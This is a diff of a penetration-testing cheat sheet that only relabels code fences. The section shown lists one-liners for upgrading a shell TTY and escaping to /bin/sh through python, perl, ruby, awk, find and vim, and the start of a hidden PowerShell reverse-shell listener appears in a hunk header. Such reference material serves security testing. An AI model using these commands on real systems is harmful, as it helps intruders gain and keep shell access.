@@ -92,19 +92,19 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
 ## Upgrading TTY
 To give us more terminal features (eg. a prompt, mouse, history, etc) we need to upgrade the TTY. Often when creating a shell via an application user eg. `apache`, no shell interpreter language has been defined in the environment variables for that user. This means that we need to spawn our own TTY to gain these functionalities.
 ### Python
-```shell
+```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
-```shell
+```bash
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 ```
 ### Interactive
-```shell
+```bash
 /bin/sh -i
 /bin/bash -i
 ```
 ### Perl
-```shell
+```bash
 perl -e 'exec "/bin/sh";'
 ```
 ```perl
@@ -112,7 +112,7 @@ perl -e 'exec "/bin/sh";'
 exec "/bin/sh";
 ```
 ### Ruby
-```shell
+```bash
 ruby -e 'exec "/bin/sh"'
 ```
 ```ruby
@@ -124,20 +124,20 @@ exec "/bin/sh"
 os.execute('/bin/sh')
 ```
 ### AWK
-```shell
+```bash
 awk 'BEGIN {system("/bin/sh")}'
 ```
 ### Find
-```shell
+```bash
 # If it finds the file, then it will execute a shell
 find / -name [file_name] -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 find . -exec /bin/sh \; -quit
 ```
 ### VIM
-```shell
+```bash
 vim -c ':!/bin/sh'
 ```
-```shell
+```bash
 # VIM escape
 vim
 :set shell=/bin/sh
